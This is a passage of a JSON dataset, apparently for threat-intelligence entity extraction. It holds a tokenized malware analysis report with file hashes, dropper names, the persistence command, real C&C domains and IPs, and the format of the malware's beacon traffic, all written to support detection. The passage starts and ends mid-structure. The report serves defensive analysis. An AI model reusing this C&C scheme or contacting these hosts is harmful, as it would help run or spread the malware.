"b8d1d74a0ad4985adaf9afe4c868ae0b"], ["c79a35313238e71a17d19de979a0d63a", "18e64b8e5ce5bdd33ce8bd9e00af672c", "86ef8f5f62ae8590d6edf45e04806515", "4c6608203e751cf27f627220269d6835"], ["78e51be60eab2c6e952c9538a46ab521"], ["b798c968cbfd53f878e13c7698610d9c", "f5f84c0c7ae871c2aa3cfe25199da628", "738c60fff066934b6f33e368cfe9a88c", "07a9975d7d96ff3b56de024ab2017582"], ["f78454d4ac3e4fe9ef5cac69b1ec43d7", "811f66d6dd2c713073c0b0aebbe74ce8", "*", "626088424.gif", "*", "1109821546.gif_dec", "*", "174239657.gif_dec"], ["*", "2334309658.gif_dec"], ["*", "2618653991.gif_dec", "*", "2627081433.gif_dec", "*", "3100425864.gif_dec"], ["*", "3198217296.gif_dec", "*", "3946889701.gif_dec", "*", "3979106736.gif_dec"], ["*", "626088424.gif_dec", "*", "1109821546.gif_dec"], ["*", "1109821546.gif", "*", "4137794344.gif", "*", "4137794344.gif_dec", "Figure", "3", "\u2013", "MD5", "checksums", "of", "pieces", "of", "stage", "3", "code", "31a31f6be9c31cb2d02c04176eb500f1aba14dd0", "804701959a1dbfbbfc6d8142de850db9fce9a611", "ac4642885ca779e7b66b8bb6aa21d3c0396f7a1d", "d8c6d3e6988516595399003d1db0abd7df334d87"], ["6cf8ca847ee317255a9084bb44ae3f38ef61e5c3"], ["0fc29adc3aca39f32763096e090a6a69e50a716f"], ["1df9b4dc693ce7250f51cbc7ced53ad0a6e1c587"], ["9d716d2f8f1c2841a2707eba2ebadd01ed830030", "497f9c688ed142ae91e354b3d9c9e13243a268b0", "b464fc5cab7a93e5607b2abb49f343e81f4fa2f1", "15c75472f160f082f6905d57a98de94c026e2c56", "00852745cb40730dc333124549a768b471dff4bc", "8cce571ca74e4b0074c09acb814541a0192ea9a8", "781d0b12bbe0a862d4a5527cd85489551cfe5d31", "e4add0b118113b2627143c7ef1d5b1327de395f1", "493d0660c9cf738be08209bfd56351d4cf075877", "118114446847ead7a2fe87ecb4943fdbdd2bbd1e", "0e263d80c46d5a538115f71e077a6175168abc5c", "d22d80da6f042c4da3392a69c713ee4d64be8bc8"], ["71d059edb81acb6b65213386bda3e2bdc724fa0f", "15c75472f160f082f6905d57a98de94c026e2c56", "804701959a1dbfbbfc6d8142de850db9fce9a611", "e17d004cd57f5f5eaa3652c926793d57ef88f1ec", "416d1035168b99cc8ba7227d4c7c3c6bc1ce169a", "*", "174239657.gif", "*", "1109821546.gif", "*", "2334309658.gif", "*", "2618653991.gif"], ["*", "2627081433.gif", "*", "3100425864.gif"], ["*", "3198217296.gif"], ["*", "3946889701.gif", "*", "3979106736.gif"], ["*", "626088424.gif", "*", "1109821546.gif_dec"], ["*", "174239657.gif_dec"], ["*", "2334309658.gif_dec"], ["*", "2618653991.gif_dec", "*", "2627081433.gif_dec", "*", "3100425864.gif_dec"], ["*", "3198217296.gif_dec", "*", "3946889701.gif_dec", "*", "3979106736.gif_dec"], ["*", "626088424.gif_dec", "*", "1109821546.gif_dec"], ["*", "1109821546.gif", "*", "4137794344.gif", "*", "4137794344.gif_dec", "Figure", "4", "\u2013", "SHA1", "checksums", "of", "pieces", "of", "stage", "3", "code"], ["3668b018b4bb080d1875aee346e3650a", "88292d7181514fda5390292d73da28d4"], ["3f301758aa3d5d123a9ddbad1890853b", "0cdf55626e56ffbf1b198beb4f6ed559"], ["cf5a5239ada9b43592757c0d7bf66169", "c03bcb0cde62b3f45b4d772ab635e2b0"], ["(", "Country", ":", "Belgium", ")", "action_plan.pdf", "(", "Country", ":", "Belgium", ")"], ["ASEM_seminar.pdf", "(", "Country", ":", "Hungary", ")"], ["EUAG_report.pdf", "(", "Country", ":", "Luxembourg", ")"], ["report.pdf", "(", "Country", ":", "Spain", ")"], ["EUAG_report.pdf", "(", "Country", ":", "Belgium", ")"], ["The", "2013", "Armenian", "Economic", "Association.pdf", "Figure", "5", "\u2013", "MD5", "checksums", "for", "known", "malicious", "documents", "(", "droppers", ")", "3", "."], ["Detection", "of", "the", "running", "malware"], ["Due", "to", "a", "large", "number", "of", "compiled", "samples", ",", "there", "is", "a", "high", "chance", "that", "the", "current", "version", "is", "difficult", "to", "detect", "by", "signatures", "."], ["Yet", ",", "there", "are", "common", "features", "in", "the", "samples", "that", "can", "be", "used", "to", "identify", "the", "malware", "components", "."], ["In", "every", "sample", "we", "checked", ",", "the", "\u201c", "Program", "Files", "/", "Startup", "\u201d", "contains", "a", "file", "with", "\u201c", ".lnk", "\u201d", "extension", "after", "installation", "."], ["This", "is", "used", "to", "start", "up", "the", "malware", "after", "the", "computer", "is", "rebooted", "."], ["An", "example", "of", "the", "lnk", "file", "created", "by", "the", "malware", ":", "The", "contents", "of", "the", ".lnk"], ["files", "are", "similar", "to", "the", "below", "described", "path", "and", "file", ",", "but", "random", "names", "are", "used", "."], ["The", "extension", "of", "the", "dll", "called", "is", "generally", "\u201c", ".tmp", "\u201d", "or", "\u201c", ".cat", "\u201d", "or", "\u201c", ".db", "\u201d", "(", "not", "sure", "about", "full", "list", ")", "and", "the", "export", "function", "called", "has", "a", "random", "name", "."], ["\"", "C:\\WINDOWS\\system32\\rundll32.exe", "\"", "C:\\DOCUME~1\\ALLUSE~1\\APPLIC~1\\base.cat", ",", "JorNgoq"], ["The", "running", "process", "of", "the", "malware", "can", "be", "pinpointed", ",", "e.g.", ",", "by", "using", "ProcessExplorer", "."], ["The", "running", "copies", "of", "stage", "1", "and", "2", "appear", "as", "separated", "rundll.exe", "processes", "."], ["It", "is", "very", "useful", "to", "create", "a", "memory", "dump", "from", "these", "running", "processes", ",", "e.g.", ",", "by", "using", "SysInternals", "ProcessExplorer", "."], ["On", "the", "picture", "below", ",", "the", "export", "function", "name", "they", "use", "is", "GqOlls", "."], ["The", "names", "seem", "to", "follow", "a", "pattern", ":", "6", "chars", "long", "with", "two", "upper", "case", "letters", "."], ["A", "not", "fully", "cross", "-", "checked", "information", "is", "that", "during", "installation", "the", "malware", "will", "be", "copied", "in", "two", "copies", "to", "the", "system", "and", "the", "two", "executables", "differ", "."], ["This", "might", "mean", "that", "the", "executable", "modifies", "itself", "."], ["For", "example", ",", "we", "recovered", "the", "following", "two", "files", ":", "md5sum", "base.cat", ":", "113e6fc85317fdd135e3f5f19e6c7a58"], ["*", "base.cat", "md5sum", "~6rld.tmp", ":", "c786a4cdfe08dbe7c64972a14669c4d1", "*", "~6rld.tmp", "where", "base.cat", "is", "the", "startup", "file", ",", "which", "is", "created", "based", "on", "~6lrd.tmp", "."], ["base.cat", "is", "stored", "in", "the", "\u201c", "All", "users", "\u201d", "directory", ",", "whereas", "~6lrd.tmp", "is", "stored", "in", "a", "user", "\u2019s", "directory", ","], ["e.g.", ",", "in", "the", "guest", "user", "directory", "as", "\u201c", "C:\\Documents", "and", "Settings\\guest\\Local", "Settings\\Application", "Data\\~6rld.tmp", "\u201d"], ["This", "user", "directory", "contains", "at", "least", "one", "more", "file", ",", "update.cmd", "with", "a", "specific", "content", "that", "could", "be", "used", "for", "detection", "."], ["E.g.", ",", "a", "search", "for", "any", "*", ".cmd", "files", "with", "content", "\u201c", "TASKKILL", "/f", "/IM", "acro", "*", "\u201d", "might", "be", "a", "a", "detection", "tool", "of", "this", "stage", "."], ["As", "for", "stage", "3", "of", "the", "attack", ",", "it", "is", "important", "to", "note", "that", "it", "is", "not", "yet", "analyized", "deeply", "."], ["So", "once", "a", "victim", "downloads", "the", "~300k", "long", "piece", "of", "code", ",", "we", "do", "n\u2019t", "know", "what", "happens", "with", "the", "previous", "stages", ",", "and", "we", "have", "no", "information", "about", "detections", "once", "this", "stage", "is", "reached", ",", "except", "the", "usage", "of", "the", "C&C", "server", "news.grouptumbler.com", "."], ["4", "."], ["C&C", "communication"], ["There", "are", "multiple", "layers", "of", "C&C", "communications", "in", "the", "malware", "."], ["First", "the", "malware", "uses"], ["Google", "search", "to", "receive", "information", "from", "its", "master", "."], ["Then", ",", "it", "uses", "the", "Twitter", "messaging", "service", "looking", "for", "the", "twits", "of", "a", "specific", "Twitter", "user", "."], ["Commands", "received", "via", "this", "channel", "trigger", "the", "download", "of", "stage", "2", "and", "stage", "3", "code", "from", "the", "C&C", "server", "."], ["We", "identified", "the", "following", "C&C", "servers", "delivering", "stage", "2", "and", "stage", "3", "codes", ":", "Attack", "location", "C&C", "server", "C&C", "IP", "/", "location", "path", "on", "C&C", "Hungary", "arabooks.ch", "194.38.160.153", "/"], ["Switzerland", "/lib", "/", "index.php", "/srch", "/", "index.php", "/forumengine", "/", "index.php", "/events", "/", "index.php", "/groups/[different", "]", "Luxembourg", "artas.org", "95.128.72.24", "/"], ["France", "/engine", "/", "index.php", "/web", "/", "index.php", "Belgium", "tsoftonline.com", "72.34.47.186", "/"], ["United", "States", "/views", "/", "index.php", "(", "Multiple", ")", "www.eamtm.com", "188.40.99.143", "/"], ["Germany", "/piwik", "/", "web", "/", "index.php", "The", "C&C", "server", "used", "by", "stage", "3", "of", "the", "malware", "is", "news.grouptumbler.com", "and", "it", "is", "located", "in", "Panama", "."], ["At", "the", "time", "of", "this", "writing", ",", "port", "80", "seems", "to", "be", "closed", "on", "this", "server", "."], ["Address", "and", "open", "port", "information", "is", "below", ":", "news.grouptumbler.com/news/feed.php", "IP", ":", "200.63.46.23"], ["Interesting", "ports", "on", "200.63.46.23", ":", "Not", "shown", ":", "65524", "closed", "ports", "PORT", "STATE", "SERVICE", "22", "/", "tcp", "open", "ssh", "111", "/", "tcp", "open", "rpcbind", "920", "/", "tcp", "open", "unknown", "1437", "/", "tcp", "open", "tabula", "46436", "/", "tcp", "open", "unknown", "Figure", "6", "\u2013", "Stage", "3", "C&C", "server", "information", "4.1", "."], ["Detection", "of", "C&C", "communications"], ["Basic", "detection", "can", "be", "based", "on", "3", "queries", "that", "are", "initiated", "by", "the", "victim", "computers", "within", "seconds", "."], ["www.google.com", "\u2013", "port", "TCP/80", "-", "HTTP"], ["twitter.com", "\u2013", "port", "TCP/443", "-", "SSL", "www.geoiptool.com", "\u2013", "port", "TCP/80", "-", "HTTP", "Figure", "7", "\u2013", "Initial", "web", "page", "\u2013", "and", "possibly", "DNS", "queries", "issued", "by", "the", "malware", "Known", "search", "strings", "in", "Google", "search", "(", "see", "below", ")", "can", "also", "be", "used", "to", "detect", "the", "malware", "."], ["Unfortunately", ",", "these", "strings", "are", "most", "likely", "unique", "to", "each", "C&C", "server", "or", "victim", ",", "thus", "unknown", "samples", "might", "use", "other", "strings", ",", "but", "possibly", "with", "the", "same", "length", "."], ["lUFEfiHKljfLKWPR", "HkyeiIDKiroLaKYr"], ["lUFEfiHKDroLaKYr", "Figure", "8", "\u2013", "Google", "search", "strings", "used", "by", "the", "malware"], ["The", "malware", "also", "sends", "a", "query", "to", "the", "geoiptool", "."], ["An", "example", "is", "shown", "below", ":", "GET", "/", "HTTP/1.1", "User", "-", "Agent", ":", "Mozilla/5.0", "(", "compatible", ";", "MSIE", "7.0", ";", "Windows", "NT", "6.0", ";", "en", "-", "US", ";", "Trident/5.0", ")"], ["Host", ":", "www.geoiptool.com", "Figure", "9", "\u2013", "Geoip", "lookup", "query", "sample", "\u2013", "Agent", "string", "might", "be", "different", "for", "each", "query", "!"], ["4.2", "."], ["Initial", "C&C", "communication"], ["Initial", "communications", "with", "the", "stage", "2/3", "delivery", "C&C", "servers", "(", "such", "as", "arabooks.ch", ")", "can", "be", "used", "to", "develop", "detection", "signatures", "as", "follows", ":"], ["The", "malware", "retrieves", "the", "URL", "using", "a", "Twitter", "query", "as", "described", "earlier", "."], ["Then", ",", "we", "can", "observe", "the", "first", "query", "from", "the", "victim", "towards", "the", "stage", "2/3", "delivery", "C&C", "server", "."], ["This", "query", "contains", "pure", "HTTP", "traffic", "on", "port", "80", "to", "the", "server", "following", "the", "template", "below", "."], ["GET", "/original", "/", "path", "/", "shortname", "/", "index.php?e", "=", "aaaaaaaaa", "where", ":", "\u2022", "shortname", "can", "be", "a", "number", "of", "strings", ",", "generally", "human", "readable", "(", "e.g.", "lib", ",", "engine", ",", "forum", ",", "forumengine", "etc", ".", ")"], ["\u2022", "\"", "e=", "\"", "is", "not", "constant", ",", "can", "be", "anything", ",", "but", "generally", "1", "-", "2", "letters", "long", "\u2022", "aaaaaaaaa", "stands", "for", "some", "Base64", "-", "like", "text", "(", "see", "details", "below", ")", "\u2022", "the", "servers", "used", "are", "assumed", "to", "be", "legitimate", "sites", ",", "just", "hacked", "by", "the", "attackers", "."], ["Based", "on", "this", "format", ",", "we", "can", "detect", "a", "valid", "query", "as", "follows", ":", "\u2022", "The", "name", "of", "the", "1st", "GET", "parameter", "should", "be", "discarded", "\u2022", "this", "means", "\"", "e=", "\"", "is", "not", "important", "\u2022", "we", "saw", "only", "one", "GET", "parameter", ",", "queries", "with", "multiple", "parameters", "are", "likely", "not", "used", "For", "detection", ",", "the", "Base64", "-", "like", "string", "\"", "aaa", "\u2026", "\"", "should", "be", "first", "modified", "as", "follows", ":"], ["\u2022", "\"", "-", "\"", "should", "be", "replaced", "by", "\"", "+", "\"", "\u2022", "\"", "_", "\"", "should", "be", "replaced", "by", "\"", "/", "\"", "This", "results", "in", "correct", "Base64", "encoding", ",", "which", "can", "be", "decoded", "with", "library", "functions", "such", "as", "base64_decode", "."], ["After", "decoding", ",", "a", "string", "of", "data", ",", "partially", "binary", "will", "be", "available", "."], ["Parts", "are", "separated", "by", "the", "delimiter", "character", "\"", "|", "\"", "."], ["The", "format", "and", "a", "numerical", "example", "are", "below", ":", "<", "binary", "data", "(", "~100", "bytes)>|<numerical", "ID", "(", "~10", "digits)>|<version", "number", ">"], ["e.g.", ",", "<", "binary", "data>|5551115551|1.13", "As", "the", "binary", "data", "itself", "may", "contain", "the", "\u201d", "|", "\u201d", "character", ",", "parsing", "should", "start", "from", "the", "end", "(", "i.e.", ",", "the", "numerical", "ID", "starts", "from", "the", "second", "\u201c", "|", "\u201d", "character", "from", "the", "end", ")", "."], ["In", "additional", ",", "the", "ID", "length", "may", "vary", "(", "not", "fully", "confirmed", ")", ",", "but", "it", "seems", "to", "be", "around", "10", "digits", "."], ["Finally", ",", "the", "version", "number", "always", "follows", "the", "pattern", "<", "1digit><dot><two", "digits", ">", ",", "e.g.", ",", "1.1X", "3.1X."], ["The", "correct", "decoding", "of", "the", "HTTP", "query", "information", "should", "be", "enough", "to", "quickly", "develop", "possible", "IDS", "-", "based", "detections", "."], ["As", "we", "have", "seen", ",", "detection", "is", "complicated", ",", "but", "not", "impossible", "."], ["The", "following", "is", "the", "summary", "of", "potential", "detection", "steps", ":", "\u2022", "Check", "if", "there", "is", "only", "one", "GET", "parameter", "\u2022", "(", "check", "if", "path", "is", "not", "empty", "and", "contains", "index.php)(possible", ",", "but", "not", "confirmed", ")", "\u2022", "convert", "the", "Base64", "-", "like", "GET", "parameter", "string", "into", "real", "Base64", "encoding", ",", "and", "check", "if", "it", "decodes", "correctly", "\u2022", "check", "if", "the", "decoded", "string", "has", "at", "least", "two", "delimieter", "character", "\"", "|", "\"", "in", "it", "\u2022"], ["check", "if", "after", "the", "last", "but", "first", "\u201c", "|", "\u201d", "character", ",", "there", "are", "digits", "only", "\u2022", "check", "if", "the", "version", "part", "of", "the", "string", "follows", "the", "format", "\u201c", "1.11", "\u201d", "or", "similar"], ["The", "header", "sent", "is", "fairly", "standard", ",", "but", "we", "include", "one", "example", "nonetheless", ":", "0x00d0", ":", "0x00e0", ":"], ["0x00f0", ":", "0x0100", ":", "0x0110", ":"], ["0x0120", ":"], ["0x0130", ":"], ["0x0140", ":", "0x0150", ":", "0x0160", ":"], ["0x0170", ":", "0x0180", ":", "2e31"], ["0a41"], ["3a20", "0a55", "696c", "6962", "5769", "5472"], ["6f50"], ["XXXX"], ["6e65", "6976", "0d0a", "6363", "677a", "7365"], ["6c61"], ["6c65"], ["6e64"], ["6964", "6174"], ["XXXX", "6374", "650d", "4163", "6570", "6970", "722d"], ["2f34"], ["3b20"], ["6f77", "656e", "682e"], ["XXXX", "696f", "0a0d", "6365", "742d", "2c20", "4167", "2e30"], ["4d53", "7320", "742f", "3129"], ["XXXX", "6e3a"], ["0a", "7074", "456e", "6465"], ["656e", "2028", "4945", "4e54", "342e", "0d0a", "XXXX", "204b", "3a20", "636f", "666c", "743a", "636f", "2037", "2035", "303b", "486f", "XX0d", "6565", "2a2f", "6469", "6174", "204d"], ["6d70", "2e30"], ["2e31", "2049", "7374", "0a43", "702d"], ["2a0d", "6e67", "650d", "6f7a"], ["6174"], ["3b20"], ["3b20", "6e66"], ["3a20", "6f6e", "416c", ".1", ".."], ["Accept:.*/"], ["*", "."], [".Accept"], ["-", "Encoding", ":", ".gzip,.deflate", "."], [".User", "-", "Agent:.Moz", "illa/4.0.(compat", "ible;.MSIE.7.0", ";", "."], ["Windows", ".", "NT.5.1", ";", "."], ["Trident/4.0;.Inf", "oPath.1)", ".."], ["Host", ":", "."], ["XXXXXXXXXXX", ".."], ["Con", "nection:.Keep", "-", "Al"], ["i", "ve", "...."], ["Figure", "10", "\u2013", "Other", "HTTP", "header", "values", "in", "a", "C&C", "query"], ["The", "used", "Agent", "strings", "vary", "significantly", "across", "queries", ",", "therefore", "they", "can", "not", "be", "really", "used", "for", "detection", ":", "Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1", ")", "Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1;+SV1", ")", "Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1;+SV1;+InfoPath.2", ")", "Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1;+Trident/4.0;+.NET+CLR+1.1.4322;+", ".NET+CLR+2.0.50727;+.NET+CLR+3.0.4506.2152;+.NET+CLR+3.5.30729;+InfoPath.2", ")"], ["Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1;+Trident/4.0;+.NET+CLR+2.0.50727", ";", "+", ".NET+CLR+3.0.4506.2152;+.NET+CLR+3.5.30729;+InfoPath.2", ")"], ["Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1;+Trident/4.0;+.NET4.0C;+.NET+CLR+", "1.1.4322;+.NET+CLR+2.0.50727;+.NET+CLR+3.0.4506.2152;+.NET+CLR+3.5.30729;+.NET4.0E", ";", "+", "InfoPath.3", ")"], ["Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1;+Trident/4.0;+GTB7.4;+InfoPath.1", ";", "+", ".NET+CLR+3.0.4506.2152;+.NET+CLR+3.5.30729;+.NET+CLR+1.0.3705;+.NET+CLR+1.1.4322;+", ".NET4.0E;+.NET4.0C;+.NET+CLR+2.0.50727", ")"], ["Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1;+Trident/4.0;+InfoPath.2", ")", "Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+Trident/4.0;+GTB7.4;+SLCC2;+.NET", "+", "CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+InfoPa", "th.3;+.NET4.0C;+.NET4.0E", ")", "Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+Trident/5.0;+SLCC2;+.NET+CLR+2.0", ".50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729", ")"], ["Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+Trident/5.0;+SLCC2;+.NET+CLR+2.0", ".50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+InfoPath.3;+Media+Center+PC+6.0;+.N", "ET4.0C;+.NET4.0E", ")", "Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+Trident/5.0;+SLCC2;+.NET+CLR+2.0", ".50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET", "4.0E", ")", "Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+Trident/5.0;+SLCC2;+.NET+CLR+2.0", ".50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+Info"], ["Path.2;+.NET4.0E", ")"], ["Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+Trident/5.0;+SLCC2;+.NET+CLR+2.0", ".50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+CMDTDF;+.NET4", "."], ["0C;+InfoPath.3", ")"], ["Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+Trident/5.0;+SLCC2;+.NET+CLR+2.0", ".50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+InfoPath.2", ")"], ["Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/5.0;+SLCC2;+.NET+", "CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0", "C;+.NET4.0E", ")"], ["Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/5.0;+SLCC2;+.NET+", "CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0", "C;+.NET4.0E;+BRI/2;+InfoPath.3", ")"], ["Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/5.0;+SLCC2;+.NET+", "CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0", "C;+.NET4.0E;+InfoPath.2", ")"], ["Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/5.0;+SLCC2;+.NET+", "CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0", "C;+.NET4.0E;+InfoPath.3", ")"], ["Mozilla/4.0+(compatible;+MSIE+8.0;+Windows+NT+5.1;+Trident/4.0;+.NET+CLR+2.0.50727", ";", "+", ".NET+CLR+3.0.04506.648;+.NET+CLR+3.5.21022;+.NET+CLR+3.0.4506.2152;+.NET+CLR+3.5.3"], ["0729;+InfoPath.2", ")"], ["Mozilla/5.0+(Windows+NT+5.1;+rv:19.0)+Gecko/20100101+Firefox/19.0"], ["Mozilla/5.0+(Windows+NT+6.1;+rv:10.0)+Gecko/20100101+Firefox/10", "."], ["Figure", "11", "\u2013", "Agent", "strings", "used", "in", "C&C", "comms", "\u2013", "might", "be", "partial", "or", "wrong", "\u2013", "not", "useful", "for", "detection", "4.3", "."], ["Other", "indicators", "of", "C&C", "communication", ":", "Google", "and", "Twitter", "queries"], ["The", "Google", "search", "step", "also", "uses", "different", "agent", "strings", ":", "\u201e", "GET", "/search/?q", "=", "lUFEfiHKDroLaKYr", "HTTP/1.1", "\"", "304", "211", "\"", "-", "\"", "\"", "Opera/7.0", "(", "compatible", ";", "MSIE", "7.0", ";", "Windows", "NT", "6.0", ";", "en", "-", "US", ";", "WOW64", ")", "\"", "\u201e", "GET", "/search?q", "=", "lUFEfiHKDroLaKYr", "HTTP/1.1", "\"", "301", "588", "\"", "-", "\"", "\"", "Opera/5.0", "(", "Windows", ";", "U", ";", "Windows", "NT", "5.2", ";", "en", "-", "US", ";", "Trident/4.0", ")", "\"", "\u201e", "GET", "/search?q", "=", "lUFEfiHKDroLaKYr", "HTTP/1.1", "\"", "301", "588", "\"", "-", "\"", "\"", "Opera/4.0", "(", "Windows", "NT", "5.1", ";", "en", "-", "GB", ";", "Trident/4.0", ")", "\""], ["Figure", "12", "\u2013", "Some", "Google", "search", "agent", "strings", "\"", "GET", "/EdithAlbert11", "HTTP/1.1", "\"", "404", "1229", "\"", "-", "\"", "\"", "Mozilla/6.0", "(", "X11", ";", "Linux", "x86_64", ";", "en", "-", "GB", ";", "Trident/5.0", ")", "\"", "\"", "GET", "/ifsWcj9a", "HTTP/1.1", "\"", "404", "529", "\"", "-", "\"", "\"", "Mozilla/5.0", "(", "compatible", ";", "MSIE", "6.0", ";", "Windows", "NT", "5.0", ";", "en", "-", "GB", ";", "WOW64", ";", "Trident/5.0", ")", "\"", "\"", "GET", "/EdithAlbert11", "HTTP/1.1", "\"", "404", "644", "\"", "-", "\"", "\"", "Mozilla/5.0", "(", "Windows", "NT", "5.1", ";", "en", "-", "GB", ";", "Trident/4.0", ")", "\"", "\"", "GET", "/ifsWcj9a", "HTTP/1.1", "\"", "404", "529", "\"", "-", "\"", "\"", "Mozilla/5.0", "(", "compatible", ";", "MSIE", "6.0", ";", "Windows", "NT", "5.0", ";", "en", ";", "WOW64", ";", "Trident/5.0", ")", "\"", "\"", "GET", "/EdithAlbert11", "HTTP/1.1", "\"", "404", "1229", "\"", "-", "\"", "\"", "Mozilla/7.0", "(", "compatible", ";", "MSIE", "7.0", ";", "Windows", "NT", "6.0", ";", "en", "-", "GB", ";", "WOW64", ")", "\"", "]", "\"", "GET", "/ifsWcj9a", "HTTP/1.1", "\"", "404", "510", "\"", "-", "\"", "\"", "Opera/5.0", "(", "compatible", ";", "MSIE", "9.0", ";", "Windows", "NT", "6.1", ";", "en", "-", "GB", ";", "SV1", ")", "\""], ["Figure", "13", "\u2013", "Twitter", "search", "samples", "\u2013", "443", "/", "SSL"], ["The", "C&C", "server", "\u2019s", "response", "\u2013", "if", "it", "sends", "encrypted", "files", "\u2013", "is", "a", "GIF", "file", "containing", "a", "small", "icon", ",", "and", "after", "that", ",", "the", "malware", ":", "0x0020", ":", "0x0030", ":"], ["0x0040", ":", "0x0050", ":", "0x0060", ":", "0x0070", ":"], ["0x0080", ":", "0x0090", ":", "0x00a0", ":", "XXXX", "2000"], ["50ee", "973f"], ["e5d4", "ecef", "eccb", "871b", "31f9", "XXXX", "f700", "934d"], ["06e9", "181d", "caa6", "b4f4", "fb9f", "9837", "XXXX"], ["00bc", "bd4e", "7522", "2df5", "e37d"], ["dac3"], ["3bfb", "0d0f"], ["XXXX", "5514"], ["05eb", "fdf9", "9f4a", "46dc", "fa91", "972e", "17e9", "4749", "faa9", "8422"], ["f5d8", "402c", "5d22", "21f8", "f1cb", "8446", "4638"], ["52eb", "1a20", "6c40", "29ec", "c152", "8e22", "b3e9", "7333", "3961", "851c"], ["32ea", "a148"], ["8a46"], ["09dc"], ["c15a"], ["ab6c", "0bfb", "2000", "f39b", "b279", "10f9", "fdf5", "8d49", "19f4"], ["f289"], ["e8d3", "XXXXXXXXGIF89a", ".."], ["......"], ["U", "..."], ["R", "....."], ["P", "..", "M.N", "...", "\"", "..", "2", "..", "y", ".?", ".."], ["u\"", "....", "l@.H", "..", "...."], ["-", "..", "J@,)", "..", "F", "..", ".....", "}", "F.]\"", "."], ["R", "..."], ["I", "........", "!", "..", "\""], [".Z", ".."], ["....", ";", "........", "l", ".."], ["1", "..", "7", ".....", "Fs3", "...."], ["Figure", "14", "\u2013", "GIF", "File", "header", "sent", "back", "by", "the", "C&C", "server", "For", "stage", "3", "(", "i.e.", ",", "<", "id>.gif", "files", ")", ",", "the", "file", "downloaded", "has", "a", "larger", "size", "(", "~300", "KB", ")", "."], ["It", "also", "begins", "with", "a", "GIF", "header", ",", "but", "that", "header", "is", "only", "13", "bytes", "long", ",", "and", "then", "starts", "the", "encrypted", "executable", ",", "as", "shown", "below", ":", "Examples", "for", "twits", "containing", "the", "URL", "of", "the", "C&C", "server", "are", "shown", "below", ":"], ["The", "weather", "is", "good", "today", "."], ["Sunny", "!"], ["uri!wp07VkkxYt3Mne5uiDkz4Il", "/", "Iw48Ge", "/", "EWg=="], ["Albert", ",", "my", "cousin", "."], ["He", "is", "working", "hard", "."], ["uri!wp07VkkxYmfNkwN2nBmx4ch", "/", "Iu2c+GJow39HbphL"], ["My", "native", "town", "was", "ruined", "by", "tornado", "."], ["uri!wp07VkkxYt3Md", "/", "JOnLhzRL2FJjY8l2It", "Figure", "15", "\u2013", "Known", "twitter", "answers", "for", "C&C", "discovery"], ["The", "twitter", "information", "is", "currently", "not", "very", "useful", "for", "content", "based", "detection", ",", "as", "it", "is", "downloaded", "through", "SSL", "connection", ",", "and", "therefore", ",", "IDS", "rules", "can", "only", "be", "applied", "if", "some", "SSL", "proxy", "is", "used", "."], ["An", "interesting", "observation", "is", "that", "this", "user", "follows", "4", "partners", ",", "most", "likely", "for", "deception", "."]]}, {"vertexSet": [[{"name": "Comment Crew", "pos": [4, 6], "sent_id": 2, "type": "Malware"}], [{"name": "GT446.ezua.COM", "pos": [58, 61], "sent_id": 11, "type": "Indicator"}], [{"name": "aunewsonline.com", "pos": [0, 1], "sent_id": 12, "type": "Indicator"}], [{"name": "avvmail.com", "pos": [1, 2], "sent_id": 12, "type": "Indicator"}], [{"name": "cas.ibooks.tk", "pos": [2, 3], "sent_id": 12, "type": "Indicator"}], [{"name": "cas.m-e.org.ru", "pos": [3, 4], "sent_id": 12, "type": "Indicator"}], [{"name": "colville.com", "pos": [4, 5], "sent_id": 12, "type": "Indicator"}], [{"name": "cvba.com", "pos": [5, 6], "sent_id": 12, "type": "Indicator"}], [{"name": "deebeedesigns.ca", "pos": [6, 7], "sent_id": 12, "type": "Indicator"}], [{"name": "dev.teamattire.com", "pos": [0, 1], "sent_id": 13, "type": "Indicator"}], [{"name": "doversolutions.co.in", "pos": [1, 2], "sent_id": 13, "type": "Indicator"}], [{"name": "download.epac.to", "pos": [2, 3], "sent_id": 13, "type": "Indicator"}], [{"name": "drgeorges.com", "pos": [0, 1], "sent_id": 14, "type": "Indicator"}], [{"name": "dril-quip.deltae.com.br", "pos": [1, 2], 